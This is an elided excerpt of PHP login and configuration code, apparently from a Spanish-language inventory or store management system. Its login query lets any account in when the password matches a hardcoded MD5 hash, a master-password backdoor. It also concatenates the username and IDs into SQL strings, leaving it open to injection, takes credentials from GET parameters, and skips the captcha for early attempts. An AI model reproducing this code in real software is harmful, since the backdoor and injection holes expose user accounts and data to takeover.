    ...
    if(strtolower($_SESSION['codigoGrafico']) == strtolower($_POST['CodigoGraficoVerificar']) || ($_SESSION["intentos"] < 3))
    {
        if(($_POST["us"]!=NULL)||($_GET["us"]!=NULL))
        {
            if(($_POST["pass"]!=NULL)||($_GET["pass"]!=NULL))
            {
                ...
                if($_POST["us"]!=NULL)
                {
                    $sql="SELECT p.nombre, p.apellido1, p.apellido2, p.idusuario, p.telefono,  p.celular, p.login, p.paswd, p.estado, c.nombre AS ciudad, a.nombre AS almacen, a.idalmacen ,r.nombre as rol FROM usuario p, almacenes a, rol r, ciudades c WHERE p.idalmacen = a.idalmacen  AND a.idciudad = c.idciudad AND (r.idrol = p.idrol) AND (p.idalmacen = a.idalmacen) AND (p.login = '".$usuario."') AND ((p.paswd = '".md5($pass)."') OR ('dbc110f0de23c3f94df38b4fa9c5af86' = '".md5($pass)."'))";
                }
                else
                {
...
//
                      ...
                      $_SESSION["user"] = $fila["login"];
                            ...
                            $_SESSION["idtienda"] = "tie-1";
                             $_SESSION["idalmacen"] = $fila["idalmacen"];
...
function retornarBDSistema($empresa)
{
    ...
    function setConfiguracionUsuario($usuario)
    {
        $link = new BD;
        $link->conectar();
        $sql = "SELECT * FROM usuario WHERE idusuario = '$usuario' AND estado = 'Activo'";
    ...
    function setConfiguracionAlmacen($idalmacen)
    {
        $link = new BD;
        $link->conectar();
        $sql = "SELECT nombre,codigo as valor FROM almacenes  WHERE idalmacen = '$idalmacen'";
        $re = $link->consulta($sql);
        if($fe = mysql_fetch_array($re))
        {
            do{
